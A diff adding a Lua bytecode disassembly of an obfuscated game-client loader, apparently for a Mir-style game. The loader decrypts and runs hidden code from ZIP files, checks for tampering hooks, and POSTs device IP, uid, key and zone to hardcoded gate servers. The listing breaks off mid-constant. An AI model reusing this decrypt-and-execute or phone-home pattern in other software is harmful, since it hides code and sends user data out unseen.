@@ -1,0 +1,2428 @@
+
+main <core_dec_original_payload.lua:0,0> (23 instructions, 92 bytes at <prototype-address-omitted>)
+0+ params, 11 slots, 0 upvalues, 10 locals, 9 constants, 1 function
+	1	[1]	LOADK    	0 -1	; 17
+	2	[1]	LOADK    	1 -2	; 34
+	3	[1]	LOADK    	2 -3	; 23
+	4	[1]	EQ       	1 -4 -5	; 0 1
+	5	[1]	JMP      	1	; to 7
+	6	[1]	LOADBOOL 	3 0 1
+	7	[1]	LOADBOOL 	3 1 0
+	8	[1]	NOT      	4 3
+	9	[1]	LOADNIL  	5 5
+	10	[1]	LOADK    	6 -6	; ""
+	11	[1]	GETGLOBAL	7 -7	; _G
+	12	[1]	GETGLOBAL	8 -8	; _ENV
+	13	[1]	GETTABLE 	9 7 -9	; "tonumber"
+	14	[1]	CLOSURE  	10 0	; <function-address-omitted>
+	15	[1]	MOVE     	0 7
+	16	[1]	MOVE     	0 9
+	17	[1]	MOVE     	0 3
+	18	[1]	MOVE     	0 4
+	19	[1]	MOVE     	0 5
+	20	[1]	MOVE     	0 6
+	21	[1]	TAILCALL 	10 1 0
+	22	[1]	RETURN   	10 0
+	23	[1]	RETURN   	0 1
+constants (9) for <prototype-address-omitted>:
+	1	17
+	2	34
+	3	23
+	4	0
+	5	1
+	6	""
+	7	"_G"
+	8	"_ENV"
+	9	"tonumber"
+locals (10) for <prototype-address-omitted>:
+	0	a	2	23
+	1	b	3	23
+	2	c	4	23
+	3	d	8	23
+	4	e	9	23
+	5	f	10	23
+	6	g	11	23
+	7	h	12	23
+	8	i	13	23
+	9	j	14	23
+upvalues (0) for <prototype-address-omitted>:
+
+function <core_dec_original_payload.lua:1,1> (457 instructions, 1828 bytes at <prototype-address-omitted>)
+0+ params, 63 slots, 6 upvalues, 49 locals, 97 constants, 19 functions
+	1	[1]	GETUPVAL 	1 0	; h
+	2	[1]	GETTABLE 	1 1 -1	; "def"
+	3	[1]	GETTABLE 	1 1 -2	; "showUserAgreement"
+	4	[1]	TEST     	1 0 0
+	5	[1]	JMP      	2	; to 8
+	6	[1]	GETUPVAL 	1 0	; h
+	7	[1]	SETTABLE 	1 -3 -4	; "argeementText" "        \228\184\128\227\128\129\228\184\141\229\190\151\229\136\169\231\148\168\230\156\172\232\189\175\228\187\182\230\136\150\230\156\172\232\189\175\228\187\182\230\156\141\229\138\161\229\136\182\228\189\156\227\128\129\228\184\138\232\189\189\227\128\129\229\164\141\229\136\182\227\128\129\229\143\145\233\128\129\229\166\130\228\184\139\229\134\133\229\174\185\239\188\154\n        (1) \229\143\141\229\175\185\229\174\170\230\179\149\230\137\128\231\161\174\229\174\154\231\154\132\229\159\186\230\156\172\229\142\159\229\136\153\231\154\132\239\188\155\n        (2) \229\141\177\229\174\179\229\155\189\229\174\182\229\174\137\229\133\168\239\188\140\230\179\132\233\156\178\229\155\189\229\174\182\231\167\152\229\175\134\239\188\140\233\162\160\232\166\134\229\155\189\229\174\182\230\148\191\230\157\131\239\188\140\231\160\180\229\157\143\229\155\189\229\174\182\231\187\159\228\184\128\231\154\132\239\188\155\n        (3) \230\141\159\229\174\179\229\155\189\229\174\182\232\141\163\232\170\137\229\146\140\229\136\169\231\155\138\231\154\132\239\188\155\n        (4) \231\133\189\229\138\168\230\176\145\230\151\143\228\187\135\230\129\168\227\128\129\230\176\145\230\151\143\230\173\167\232\167\134\239\188\140\231\160\180\229\157\143\230\176\145\230\151\143\229\155\162\231\187\147\231\154\132\239\188\155\n        (5) \231\160\180\229\157\143\229\155\189\229\174\182\229\174\151\230\149\153\230\148\191\231\173\150\239\188\140\229\174\163\230\137\172\233\130\170\230\149\153\229\146\140\229\176\129\229\187\186\232\191\183\228\191\161\231\154\132\239\188\155\n        (6) \230\149\163\229\184\131\232\176\163\232\168\128\239\188\140\230\137\176\228\185\177\231\164\190\228\188\154\231\167\169\229\186\143\239\188\140\231\160\180\229\157\143\231\164\190\228\188\154\231\168\179\229\174\154\231\154\132\239\188\155\n        (7) \230\149\163\229\184\131\230\183\171\231\167\189\227\128\129\232\137\178\230\131\133\227\128\129\232\181\140\229\141\154\227\128\129\230\154\180\229\138\155\227\128\129\229\135\182\230\157\128\227\128\129\230\129\144\230\128\150\230\136\150\232\128\133\230\149\153\229\148\134\231\138\175\231\189\170\231\154\132\239\188\155\n        (8) \228\190\174\232\190\177\230\136\150\232\128\133\232\175\189\232\176\164\228\187\150\228\186\186\239\188\140\228\190\181\229\174\179\228\187\150\228\186\186\229\144\136\230\179\149\230\157\131\231\155\138\231\154\132\239\188\155\n        (9) \229\144\171\230\156\137\230\179\149\229\190\139\227\128\129\232\161\140\230\148\191\230\179\149\232\167\132\231\166\129\230\173\162\231\154\132\229\133\182\228\187\150\229\134\133\229\174\185\231\154\132\228\191\161\230\129\175\227\128\130\n        \228\186\140\227\128\129\230\156\172\230\184\184\230\136\143\230\137\128\230\156\137\231\180\160\230\157\144\229\157\135\230\157\165\232\135\170\228\186\146\232\129\148\231\189\145\239\188\140\229\166\130\233\129\135\228\190\181\230\157\131\232\175\183\232\129\148\231\179\187GM\229\136\160\233\153\164\227\128\130\n        \228\184\137\227\128\129\232\139\165\230\130\168\229\175\185\230\156\172\230\184\184\230\136\143\229\143\138\230\156\172\230\156\141\229\138\161\230\156\137\228\187\187\228\189\149\230\132\143\232\167\129\239\188\140\230\172\162\232\191\142\232\129\148\231\179\187\230\184\184\230\136\143\231\149\140\233\157\162\228\184\173\231\154\132\229\174\162\230\156\141\232\129\148\231\179\187\230\150\185\229\188\143\227\128\130\n    "
+	8	[1]	LOADK    	1 -5	; "http://go.zejiang.wang/gv6"
+	9	[1]	LOADK    	2 -6	; "http://gate.zejiang.wang:88/gv6"
+	10	[1]	NEWTABLE 	3 8 0
+	11	[1]	LOADK    	4 -7	; "81"
+	12	[1]	LOADK    	5 -8	; "88"
+	13	[1]	LOADK    	6 -9	; "89"
+	14	[1]	LOADK    	7 -10	; "90"
+	15	[1]	LOADK    	8 -11	; "91"
+	16	[1]	LOADK    	9 -12	; "92"
+	17	[1]	LOADK    	10 -13	; "93"
+	18	[1]	LOADK    	11 -14	; "94"
+	19	[1]	SETLIST  	3 8 1	; 1
+	20	[1]	NEWTABLE 	4 4 0
+	21	[1]	LOADK    	5 -6	; "http://gate.zejiang.wang:88/gv6"
+	22	[1]	LOADK    	6 -15	; "http://tm2.zejiang.wang/gv6"
+	23	[1]	LOADK    	7 -16	; "http://tm3.zejiang.wang/gv6"
+	24	[1]	LOADK    	8 -17	; "http://sng.zejiang.wang:99/gv6"
+	25	[1]	SETLIST  	4 4 1	; 1
+	26	[1]	MOVE     	5 2
+	27	[1]	GETUPVAL 	6 1	; j
+	28	[1]	LOADK    	7 -18	; "4"
+	29	[1]	CALL     	6 2 2
+	30	[1]	GETUPVAL 	7 1	; j
+	31	[1]	LOADK    	8 -19	; "1"
+	32	[1]	CALL     	7 2 2
+	33	[1]	GETUPVAL 	8 0	; h
+	34	[1]	GETTABLE 	8 8 -20	; "device"
+	35	[1]	GETTABLE 	8 8 -21	; "writablePath"
+	36	[1]	LOADK    	9 -22	; "cache/ao/"
+	37	[1]	CONCAT   	8 8 9
+	38	[1]	GETUPVAL 	9 2	; d
+	39	[1]	GETUPVAL 	10 0	; h
+	40	[1]	GETTABLE 	10 10 -23	; "getinfo"
+	41	[1]	GETUPVAL 	11 0	; h
+	42	[1]	GETTABLE 	11 11 -24	; "string"
+	43	[1]	GETTABLE 	11 11 -25	; "len"
+	44	[1]	GETUPVAL 	12 2	; d
+	45	[1]	GETUPVAL 	13 0	; h
+	46	[1]	GETTABLE 	13 13 -1	; "def"
+	47	[1]	GETTABLE 	13 13 -26	; "gateIP"
+	48	[1]	CLOSURE  	14 0	; <function-address-omitted>
+	49	[1]	LOADK    	15 -27	; "nofile"
+	50	[1]	GETUPVAL 	16 0	; h
+	51	[1]	GETTABLE 	16 16 -1	; "def"
+	52	[1]	GETTABLE 	16 16 -28	; "role"
+	53	[1]	GETUPVAL 	17 3	; e
+	54	[1]	SETTABLE 	16 -29 17	; "open" -
+	55	[1]	CLOSURE  	16 1	; <function-address-omitted>
+	56	[1]	MOVE     	17 8
+	57	[1]	GETUPVAL 	18 0	; h
+	58	[1]	GETTABLE 	18 18 -30	; "core_func_md5"
+	59	[1]	GETUPVAL 	19 0	; h
+	60	[1]	GETTABLE 	19 19 -1	; "def"
+	61	[1]	GETTABLE 	19 19 -28	; "role"
+	62	[1]	GETTABLE 	19 19 -31	; "stuff"
+	63	[1]	TEST     	19 0 1
+	64	[1]	JMP      	1	; to 66
+	65	[1]	LOADK    	19 -32	; "999"
+	66	[1]	CALL     	18 2 2
+	67	[1]	CONCAT   	17 17 18
+	68	[1]	GETUPVAL 	18 0	; h
+	69	[1]	GETTABLE 	18 18 -33	; "io"
+	70	[1]	GETTABLE 	18 18 -34	; "exists"
+	71	[1]	MOVE     	19 8
+	72	[1]	CALL     	18 2 2
+	73	[1]	TEST     	18 0 1
+	74	[1]	JMP      	7	; to 82
+	75	[1]	GETUPVAL 	18 0	; h
+	76	[1]	GETTABLE 	18 18 -35	; "ycFunction"
+	77	[1]	GETTABLE 	18 18 -36	; "mkdir"
+	78	[1]	GETUPVAL 	19 0	; h
+	79	[1]	GETTABLE 	19 19 -35	; "ycFunction"
+	80	[1]	MOVE     	20 8
+	81	[1]	CALL     	18 3 1
+	82	[1]	CLOSURE  	18 2	; <function-address-omitted>
+	83	[1]	CLOSURE  	19 3	; <function-address-omitted>
+	84	[1]	MOVE     	0 10
+	85	[1]	GETUPVAL 	0 0	; h
+	86	[1]	MOVE     	0 16
+	87	[1]	MOVE     	0 14
+	88	[1]	CLOSURE  	20 4	; <function-address-omitted>
+	89	[1]	MOVE     	0 10
+	90	[1]	GETUPVAL 	0 0	; h
+	91	[1]	GETUPVAL 	0 4	; f
+	92	[1]	GETUPVAL 	0 2	; d
+	93	[1]	GETUPVAL 	0 3	; e
+	94	[1]	CLOSURE  	21 5	; <function-address-omitted>
+	95	[1]	MOVE     	0 10
+	96	[1]	GETUPVAL 	0 0	; h
+	97	[1]	CLOSURE  	22 6	; <function-address-omitted>
+	98	[1]	GETUPVAL 	0 0	; h
+	99	[1]	MOVE     	0 17
+	100	[1]	MOVE     	0 19
+	101	[1]	MOVE     	0 21
+	102	[1]	MOVE     	0 12
+	103	[1]	GETUPVAL 	0 3	; e
+	104	[1]	MOVE     	0 15
+	105	[1]	GETUPVAL 	0 2	; d
+	106	[1]	CLOSURE  	23 7	; <function-address-omitted>
+	107	[1]	GETUPVAL 	0 0	; h
+	108	[1]	MOVE     	0 17
+	109	[1]	MOVE     	0 15
+	110	[1]	CLOSURE  	24 8	; <function-address-omitted>
+	111	[1]	MOVE     	0 20
+	112	[1]	MOVE     	0 17
+	113	[1]	CLOSURE  	25 9	; <function-address-omitted>
+	114	[1]	MOVE     	0 20
+	115	[1]	MOVE     	0 17
+	116	[1]	GETUPVAL 	0 0	; h
+	117	[1]	CLOSURE  	26 10	; <function-address-omitted>
+	118	[1]	MOVE     	0 7
+	119	[1]	MOVE     	0 6
+	120	[1]	MOVE     	0 5
+	121	[1]	MOVE     	0 4
+	122	[1]	GETUPVAL 	0 1	; j
+	123	[1]	GETUPVAL 	0 0	; h
+	124	[1]	MOVE     	0 15
+	125	[1]	MOVE     	0 26
+	126	[1]	MOVE     	0 22
+	127	[1]	GETUPVAL 	0 3	; e
+	128	[1]	MOVE     	0 19
+	129	[1]	MOVE     	0 21
+	130	[1]	MOVE     	0 25
+	131	[1]	MOVE     	0 24
+	132	[1]	MOVE     	0 18
+	133	[1]	GETUPVAL 	0 5	; g
+	134	[1]	MOVE     	0 13
+	135	[1]	CLOSURE  	27 11	; <function-address-omitted>
+	136	[1]	MOVE     	0 15
+	137	[1]	GETUPVAL 	0 0	; h
+	138	[1]	MOVE     	0 1
+	139	[1]	MOVE     	0 26
+	140	[1]	GETUPVAL 	0 2	; d
+	141	[1]	GETUPVAL 	0 1	; j
+	142	[1]	MOVE     	0 22
+	143	[1]	MOVE     	0 27
+	144	[1]	GETUPVAL 	0 3	; e
+	145	[1]	MOVE     	0 19
+	146	[1]	MOVE     	0 21
+	147	[1]	MOVE     	0 25
+	148	[1]	MOVE     	0 24
+	149	[1]	MOVE     	0 18
+	150	[1]	GETUPVAL 	0 5	; g
+	151	[1]	MOVE     	0 13
+	152	[1]	GETUPVAL 	28 0	; h
+	153	[1]	GETTABLE 	28 28 -37	; "math"
+	154	[1]	GETTABLE 	28 28 -38	; "floor"
+	155	[1]	GETUPVAL 	29 0	; h
+	156	[1]	GETTABLE 	29 29 -37	; "math"
+	157	[1]	GETTABLE 	29 29 -39	; "exp"
+	158	[1]	GETUPVAL 	30 0	; h
+	159	[1]	GETTABLE 	30 30 -37	; "math"
+	160	[1]	GETTABLE 	30 30 -40	; "sqrt"
+	161	[1]	GETUPVAL 	31 0	; h
+	162	[1]	GETTABLE 	31 31 -24	; "string"
+	163	[1]	GETTABLE 	31 31 -41	; "char"
+	164	[1]	GETUPVAL 	32 0	; h
+	165	[1]	GETTABLE 	32 32 -24	; "string"
+	166	[1]	GETTABLE 	32 32 -42	; "reverse"
+	167	[1]	CLOSURE  	33 12	; <function-address-omitted>
+	168	[1]	GETUPVAL 	0 1	; j
+	169	[1]	CLOSURE  	34 13	; <function-address-omitted>
+	170	[1]	MOVE     	0 33
+	171	[1]	MOVE     	0 28
+	172	[1]	MOVE     	0 29
+	173	[1]	GETUPVAL 	0 0	; h
+	174	[1]	GETUPVAL 	0 1	; j
+	175	[1]	MOVE     	0 30
+	176	[1]	MOVE     	0 32
+	177	[1]	MOVE     	0 31
+	178	[1]	GETUPVAL 	35 0	; h
+	179	[1]	GETTABLE 	35 35 -43	; "pcall"
+	180	[1]	MOVE     	36 34
+	181	[1]	CALL     	35 2 3
+	182	[1]	GETUPVAL 	37 0	; h
+	183	[1]	GETTABLE 	37 37 -20	; "device"
+	184	[1]	GETTABLE 	37 37 -21	; "writablePath"
+	185	[1]	LOADK    	38 -44	; "res/"
+	186	[1]	CONCAT   	37 37 38
+	187	[1]	GETUPVAL 	38 0	; h
+	188	[1]	GETTABLE 	38 38 -24	; "string"
+	189	[1]	GETTABLE 	38 38 -45	; "format"
+	190	[1]	LOADK    	39 -46	; "core%s.zip"
+	191	[1]	GETUPVAL 	40 0	; h
+	192	[1]	GETTABLE 	40 40 -47	; "USE_ARM64"
+	193	[1]	TEST     	40 0 0
+	194	[1]	JMP      	3	; to 198
+	195	[1]	LOADK    	40 -48	; "64"
+	196	[1]	TEST     	40 0 1
+	197	[1]	JMP      	1	; to 199
+	198	[1]	GETUPVAL 	40 5	; g
+	199	[1]	CALL     	38 3 2
+	200	[1]	GETUPVAL 	39 0	; h
+	201	[1]	GETTABLE 	39 39 -24	; "string"
+	202	[1]	GETTABLE 	39 39 -45	; "format"
+	203	[1]	LOADK    	40 -49	; "dcore%s.zip"
+	204	[1]	GETUPVAL 	41 0	; h
+	205	[1]	GETTABLE 	41 41 -47	; "USE_ARM64"
+	206	[1]	TEST     	41 0 0
+	207	[1]	JMP      	3	; to 211
+	208	[1]	LOADK    	41 -48	; "64"
+	209	[1]	TEST     	41 0 1
+	210	[1]	JMP      	1	; to 212
+	211	[1]	GETUPVAL 	41 5	; g
+	212	[1]	CALL     	39 3 2
+	213	[1]	GETUPVAL 	40 0	; h
+	214	[1]	GETTABLE 	40 40 -33	; "io"
+	215	[1]	GETTABLE 	40 40 -34	; "exists"
+	216	[1]	MOVE     	41 37
+	217	[1]	CALL     	40 2 2
+	218	[1]	TEST     	40 0 1
+	219	[1]	JMP      	7	; to 227
+	220	[1]	GETUPVAL 	40 0	; h
+	221	[1]	GETTABLE 	40 40 -35	; "ycFunction"
+	222	[1]	GETTABLE 	40 40 -36	; "mkdir"
+	223	[1]	GETUPVAL 	41 0	; h
+	224	[1]	GETTABLE 	41 41 -35	; "ycFunction"
+	225	[1]	MOVE     	42 37
+	226	[1]	CALL     	40 3 1
+	227	[1]	GETUPVAL 	40 0	; h
+	228	[1]	GETTABLE 	40 40 -33	; "io"
+	229	[1]	GETTABLE 	40 40 -34	; "exists"
+	230	[1]	MOVE     	41 37
+	231	[1]	MOVE     	42 38
+	232	[1]	CONCAT   	41 41 42
+	233	[1]	CALL     	40 2 2
+	234	[1]	TEST     	40 0 1
+	235	[1]	JMP      	23	; to 259
+	236	[1]	GETUPVAL 	40 0	; h
+	237	[1]	GETTABLE 	40 40 -50	; "an"
+	238	[1]	GETTABLE 	40 40 -51	; "newMsgbox"
+	239	[1]	LOADK    	41 -52	; "\228\189\160\231\154\132\231\153\187\233\153\134\229\153\168\228\184\141\230\152\175G\231\137\136\231\153\187\233\153\134\229\153\168\n\232\175\183\228\184\139\232\189\189bzmir.bin\239\188\129 "
+	240	[1]	CLOSURE  	42 14	; <function-address-omitted>
+	241	[1]	GETUPVAL 	0 1	; j
+	242	[1]	GETUPVAL 	0 0	; h
+	243	[1]	NEWTABLE 	43 0 2
+	244	[1]	GETUPVAL 	44 3	; e
+	245	[1]	SETTABLE 	43 -53 44	; "center" -
+	246	[1]	GETUPVAL 	44 2	; d
+	247	[1]	SETTABLE 	43 -54 44	; "close" -
+	248	[1]	CALL     	40 4 1
+	249	[1]	GETUPVAL 	40 0	; h
+	250	[1]	GETTABLE 	40 40 -55	; "scheduler"
+	251	[1]	GETTABLE 	40 40 -56	; "performWithDelayGlobal"
+	252	[1]	CLOSURE  	41 15	; <function-address-omitted>
+	253	[1]	GETUPVAL 	0 0	; h
+	254	[1]	GETUPVAL 	42 1	; j
+	255	[1]	LOADK    	43 -57	; "6"
+	256	[1]	CALL     	42 2 0
+	257	[1]	CALL     	40 0 1
+	258	[1]	RETURN   	0 1
+	259	[1]	MOVE     	40 10
+	260	[1]	GETUPVAL 	41 0	; h
+	261	[1]	GETTABLE 	41 41 -58	; "cc"
+	262	[1]	GETTABLE 	41 41 -59	; "Crypto"
+	263	[1]	GETTABLE 	41 41 -60	; "decryptXXTEA"
+	264	[1]	CALL     	40 2 2
+	265	[1]	GETTABLE 	40 40 -61	; "what"
+	266	[1]	EQ       	1 40 -62	; - "C"
+	267	[1]	JMP      	4	; to 272
+	268	[1]	GETUPVAL 	40 0	; h
+	269	[1]	GETTABLE 	40 40 -63	; "core_func_byby"
+	270	[1]	LOADK    	41 -64	; "\233\157\158\230\179\149hook"
+	271	[1]	CALL     	40 2 1
+	272	[1]	GETUPVAL 	40 0	; h
+	273	[1]	GETTABLE 	40 40 -33	; "io"
+	274	[1]	GETTABLE 	40 40 -65	; "readfile"
+	275	[1]	MOVE     	41 37
+	276	[1]	MOVE     	42 38
+	277	[1]	CONCAT   	41 41 42
+	278	[1]	CALL     	40 2 2
+	279	[1]	TEST     	40 0 1
+	280	[1]	JMP      	4	; to 285
+	281	[1]	GETUPVAL 	41 0	; h
+	282	[1]	GETTABLE 	41 41 -63	; "core_func_byby"
+	283	[1]	LOADK    	42 -66	; "core\231\188\186\229\164\177"
+	284	[1]	CALL     	41 2 1
+	285	[1]	GETUPVAL 	41 0	; h
+	286	[1]	GETTABLE 	41 41 -67	; "core_func_decryptTEA"
+	287	[1]	MOVE     	42 40
+	288	[1]	MOVE     	43 36
+	289	[1]	LOADK    	44 -68	; "\231\136\178"
+	290	[1]	CONCAT   	43 43 44
+	291	[1]	CALL     	41 3 2
+	292	[1]	GETUPVAL 	42 0	; h
+	293	[1]	GETTABLE 	42 42 -69	; "core_func_writefile"
+	294	[1]	MOVE     	43 37
+	295	[1]	MOVE     	44 39
+	296	[1]	CONCAT   	43 43 44
+	297	[1]	MOVE     	44 41
+	298	[1]	CALL     	42 3 1
+	299	[1]	GETUPVAL 	42 0	; h
+	300	[1]	GETTABLE 	42 42 -58	; "cc"
+	301	[1]	GETTABLE 	42 42 -70	; "LuaLoadChunksFromZIP"
+	302	[1]	MOVE     	43 39
+	303	[1]	CALL     	42 2 1
+	304	[1]	GETUPVAL 	42 0	; h
+	305	[1]	GETTABLE 	42 42 -71	; "os"
+	306	[1]	GETTABLE 	42 42 -72	; "remove"
+	307	[1]	MOVE     	43 37
+	308	[1]	MOVE     	44 39
+	309	[1]	CONCAT   	43 43 44
+	310	[1]	CALL     	42 2 1
+	311	[1]	GETUPVAL 	42 0	; h
+	312	[1]	GETTABLE 	42 42 -33	; "io"
+	313	[1]	GETTABLE 	42 42 -34	; "exists"
+	314	[1]	MOVE     	43 37
+	315	[1]	GETUPVAL 	44 0	; h
+	316	[1]	GETTABLE 	44 44 -24	; "string"
+	317	[1]	GETTABLE 	44 44 -45	; "format"
+	318	[1]	LOADK    	45 -73	; "hookcore%s.zip"
+	319	[1]	GETUPVAL 	46 0	; h
+	320	[1]	GETTABLE 	46 46 -47	; "USE_ARM64"
+	321	[1]	TEST     	46 0 0
+	322	[1]	JMP      	3	; to 326
+	323	[1]	LOADK    	46 -48	; "64"
+	324	[1]	TEST     	46 0 1
+	325	[1]	JMP      	1	; to 327
+	326	[1]	GETUPVAL 	46 5	; g
+	327	[1]	CALL     	44 3 2
+	328	[1]	CONCAT   	43 43 44
+	329	[1]	CALL     	42 2 2
+	330	[1]	TEST     	42 0 0
+	331	[1]	JMP      	17	; to 349
+	332	[1]	GETUPVAL 	42 0	; h
+	333	[1]	GETTABLE 	42 42 -58	; "cc"
+	334	[1]	GETTABLE 	42 42 -70	; "LuaLoadChunksFromZIP"
+	335	[1]	GETUPVAL 	43 0	; h
+	336	[1]	GETTABLE 	43 43 -24	; "string"
+	337	[1]	GETTABLE 	43 43 -45	; "format"
+	338	[1]	LOADK    	44 -73	; "hookcore%s.zip"
+	339	[1]	GETUPVAL 	45 0	; h
+	340	[1]	GETTABLE 	45 45 -47	; "USE_ARM64"
+	341	[1]	TEST     	45 0 0
+	342	[1]	JMP      	3	; to 346
+	343	[1]	LOADK    	45 -48	; "64"
+	344	[1]	TEST     	45 0 1
+	345	[1]	JMP      	1	; to 347
+	346	[1]	GETUPVAL 	45 5	; g
+	347	[1]	CALL     	43 3 0
+	348	[1]	CALL     	42 0 1
+	349	[1]	MOVE     	42 23
+	350	[1]	CALL     	42 1 1
+	351	[1]	MOVE     	42 22
+	352	[1]	CALL     	42 1 1
+	353	[1]	MOVE     	42 15
+	354	[1]	GETUPVAL 	43 0	; h
+	355	[1]	CLOSURE  	44 16	; <function-address-omitted>
+	356	[1]	GETUPVAL 	0 0	; h
+	357	[1]	SETTABLE 	43 -74 44	; "set_helper" -
+	358	[1]	GETUPVAL 	43 0	; h
+	359	[1]	GETTABLE 	43 43 -75	; "core_func_createNet"
+	360	[1]	CLOSURE  	44 17	; <function-address-omitted>
+	361	[1]	GETUPVAL 	0 0	; h
+	362	[1]	MOVE     	0 26
+	363	[1]	GETUPVAL 	0 2	; d
+	364	[1]	GETUPVAL 	0 1	; j
+	365	[1]	MOVE     	0 22
+	366	[1]	MOVE     	0 27
+	367	[1]	GETUPVAL 	0 3	; e
+	368	[1]	MOVE     	0 19
+	369	[1]	MOVE     	0 21
+	370	[1]	MOVE     	0 25
+	371	[1]	MOVE     	0 24
+	372	[1]	MOVE     	45 18
+	373	[1]	MOVE     	46 1
+	374	[1]	CALL     	45 2 2
+	375	[1]	LOADK    	46 -76	; "POST"
+	376	[1]	CALL     	43 4 2
+	377	[1]	GETUPVAL 	44 0	; h
+	378	[1]	GETTABLE 	44 44 -35	; "ycFunction"
+	379	[1]	GETTABLE 	44 44 -77	; "getFileData"
+	380	[1]	GETUPVAL 	45 0	; h
+	381	[1]	GETTABLE 	45 45 -35	; "ycFunction"
+	382	[1]	LOADK    	46 -78	; "gplus.bin"
+	383	[1]	GETUPVAL 	47 3	; e
+	384	[1]	CALL     	44 4 3
+	385	[1]	CLOSURE  	46 18	; <function-address-omitted>
+	386	[1]	GETUPVAL 	0 0	; h
+	387	[1]	LOADK    	47 -79	; "smlt_"
+	388	[1]	MOVE     	48 46
+	389	[1]	GETUPVAL 	49 5	; g
+	390	[1]	GETUPVAL 	50 0	; h
+	391	[1]	GETTABLE 	50 50 -71	; "os"
+	392	[1]	GETTABLE 	50 50 -80	; "time"
+	393	[1]	CALL     	50 1 2
+	394	[1]	CONCAT   	49 49 50
+	395	[1]	CALL     	48 2 2
+	396	[1]	CONCAT   	47 47 48
+	397	[1]	LOADK    	48 -81	; "none"
+	398	[1]	GETUPVAL 	49 0	; h
+	399	[1]	GETTABLE 	49 49 -82	; "g_data"
+	400	[1]	GETTABLE 	49 49 -83	; "login"
+	401	[1]	GETTABLE 	49 49 -84	; "localLastSer"
+	402	[1]	TEST     	49 0 0
+	403	[1]	JMP      	17	; to 421
+	404	[1]	GETUPVAL 	49 0	; h
+	405	[1]	GETTABLE 	49 49 -82	; "g_data"
+	406	[1]	GETTABLE 	49 49 -83	; "login"
+	407	[1]	GETTABLE 	49 49 -84	; "localLastSer"
+	408	[1]	GETTABLE 	49 49 -85	; "zonename"
+	409	[1]	TEST     	49 0 0
+	410	[1]	JMP      	10	; to 421
+	411	[1]	GETUPVAL 	49 0	; h
+	412	[1]	GETTABLE 	49 49 -86	; "crypto"
+	413	[1]	GETTABLE 	49 49 -87	; "encodeBase64"
+	414	[1]	GETUPVAL 	50 0	; h
+	415	[1]	GETTABLE 	50 50 -82	; "g_data"
+	416	[1]	GETTABLE 	50 50 -83	; "login"
+	417	[1]	GETTABLE 	50 50 -84	; "localLastSer"
+	418	[1]	GETTABLE 	50 50 -85	; "zonename"
+	419	[1]	CALL     	49 2 2
+	420	[1]	MOVE     	48 49
+	421	[1]	GETTABLE 	49 43 -88	; "setPOSTData"
+	422	[1]	MOVE     	50 43
+	423	[1]	LOADK    	51 -89	; "ip="
+	424	[1]	GETUPVAL 	52 0	; h
+	425	[1]	GETTABLE 	52 52 -86	; "crypto"
+	426	[1]	GETTABLE 	52 52 -87	; "encodeBase64"
+	427	[1]	MOVE     	53 13
+	428	[1]	CALL     	52 2 2
+	429	[1]	LOADK    	53 -90	; "&uid="
+	430	[1]	MOVE     	54 47
+	431	[1]	LOADK    	55 -91	; "&code="
+	432	[1]	MOVE     	56 45
+	433	[1]	LOADK    	57 -92	; "&key="
+	434	[1]	GETUPVAL 	58 0	; h
+	435	[1]	GETTABLE 	58 58 -86	; "crypto"
+	436	[1]	GETTABLE 	58 58 -93	; "decodeBase64"
+	437	[1]	GETUPVAL 	59 0	; h
+	438	[1]	GETTABLE 	59 59 -1	; "def"
+	439	[1]	GETTABLE 	59 59 -28	; "role"
+	440	[1]	GETTABLE 	59 59 -31	; "stuff"
+	441	[1]	CALL     	58 2 2
+	442	[1]	LOADK    	59 -94	; "&version="
+	443	[1]	MOVE     	60 42
+	444	[1]	LOADK    	61 -95	; "&zone="
+	445	[1]	MOVE     	62 48
+	446	[1]	CONCAT   	51 51 62
+	447	[1]	CALL     	49 3 1
+	448	[1]	GETTABLE 	49 43 -96	; "setTimeout"
+	449	[1]	MOVE     	50 43
+	450	[1]	GETUPVAL 	51 1	; j
+	451	[1]	LOADK    	52 -57	; "6"
+	452	[1]	CALL     	51 2 0
+	453	[1]	CALL     	49 0 1
+	454	[1]	GETTABLE 	49 43 -97	; "start"
+	455	[1]	MOVE     	50 43
+	456	[1]	CALL     	49 2 1
+	457	[1]	RETURN   	0 1
+constants (97) for <prototype-address-omitted>:
+	1	"def"
+	2	"showUserAgreement"
+	3	"argeementText"
+	4	"        \228\184\128\227\128\129\228\184\141\229\190\151\229\136\169\231\148\168\230\156\172\232\189\175\228\187\182\230\136\150\230\156\172\232\189\175\228\187\182\230\156\141\229\138\161\229\136\182\228\189\156\227\128\129\228\184\138\232\189\189\227\128\129\229\164\141\229\136\182\227\128\129\229\143\145\233\128\129\229\166\130\228\184\139\229\134\133\229\174\185\239\188\154\n        (1) \229\143\141\229\175\185\229\174\170\230\179\149\230\137\128\231\161\174\229\174\154\231\154\132\229\159\186\230\156\172\229\142\159\229\136\153\231\154\132\239\188\155\n        (2) \229\141\177\229\174\179\229\155\189\229\174\182\229\174\137\229\133\168\239\188\140\230\179\132\233\156\178\229\155\189\229\174\182\231\167\152\229\175\134\239\188\140\233\162\160\232\166\134\229\155\189\229\174\182\230\148\191\230\157\131\239\188\140\231\160\180\229\157\143\229\155\189\229\174\182\231\187\159\228\184\128\231\154\132\239\188\155\n        (3) \230\141\159\229\174\179\229\155\189\229\174\182\232\141\163\232\170\137\229\146\140\229\136\169\231\155\138\231\154\132\239\188\155\n        (4) \231\133\189\229\138\168\230\176\145\230\151\143\228\187\135\230\129\168\227\128\129\230\176\145\230\151\143\230\173\167\232\167\134\239\188\140\231\160\180\229\157\143\230\176\145\230\151\143\229\155\162\231\187\147\231\154\132\239\188\155\n        (5) \231\160\180\229\157\143\229\155\189\229\174\182\229\174\151\230\149\153\230\148\191\231\173\150\239\188\140\229\174\163\230\137\172\233\130\170\230\149\153\229\146\140\229\176\129\229\187\186\232\191\183\228\191\161\231\154\132\239\188\155\n        (6) \230\149\163\229\184\131\232\176\163\232\168\128\239\188\140\230\137\176\228\185\177\231\164\190\228\188\154\231\167\169\229\186\143\239\188\140\231\160\180\229\157\143\231\164\190\228\188\154\231\168\179\229\174\154\231\154\132\239\188\155\n        (7) \230\149\163\229\184\131\230\183\171\231\167\189\227\128\129\232\137\178\230\131\133\227\128\129\232\181\140\229\141\154\227\128\129\230\154\180\229\138\155\227\128\129\229\135\182\230\157\128\227\128\129\230\129\144\230\128\150\230\136\150\232\128\133\230\149\153\229\148\134\231\138\175\231\189\170\231\154\132\239\188\155\n        (8) 